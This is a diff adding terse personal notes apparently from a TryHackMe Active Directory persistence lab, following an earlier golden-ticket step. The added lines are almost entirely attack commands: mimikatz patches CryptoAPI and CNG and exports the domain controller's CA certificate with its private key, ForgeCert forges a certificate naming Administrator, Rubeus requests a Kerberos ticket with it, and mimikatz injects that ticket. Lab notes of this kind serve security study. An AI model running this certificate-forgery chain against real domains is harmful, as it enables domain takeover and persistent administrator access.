@@ -280,6 +280,22 @@
         
         Golden ticket for 'forge @ za.tryhackme.loc' successfully submitted for current session
 
-  
+        sign own certificates by using private cert
+          //use mimikatz to load the certi
+          mimikatz # crypto::certificates /systemstore:local_machine  //check if we can view cert on DC
+          mimikatz # privilege::debug
+          mimikatz # crypto::capi
+          Local CryptoAPI RSA CSP patched
+          Local CryptoAPI DSS CSP patched
+          
+          mimikatz # crypto::cng
+          "KeyIso" service patched
+        mimikatz # crypto::certificates /systemstore:local_machine /export
+          .pfx is the cert file
+        ForgeCert.exe --CaCertPath c:\Users\grace.clarke\local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword tryhackme 
+        Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:
+\Tools\ForgeCert\fullAdmin.pfx /password:tryhackme /outfile:my.kirbi /domain:za.tryhackme.loc /dc:10.50.6
+2.100
+        mimikatz # kerberos::ptt my.kirbi
 
   
